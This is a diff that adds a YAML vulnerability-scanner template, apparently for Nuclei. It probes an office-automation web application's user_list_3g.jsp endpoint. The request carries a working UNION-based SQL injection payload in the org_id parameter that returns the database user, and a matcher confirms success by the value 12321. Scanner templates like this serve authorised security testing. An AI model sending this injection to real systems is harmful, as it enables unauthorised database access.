@@ -1,0 +1,23 @@
+id: msk-template
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        GET /jsoa/wap2/personalMessage/user_list_3g.jsp?org_id=0%20%20union/**/select/**/1,concat(111*111,user())%20%23&userIds=1&userNames=1&content=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Pixel 2 Build/OPM2.171019.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/3262 MMWEBSDK/201201 Mobile Safari/537.36 MMWEBID/7372 MicroMessenger/8.0.1840(0x28000036) Process/toolsmp WeChat/arm32 Weixin NetType/WIFI Language/zh_CN ABI/arm64
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"12321")
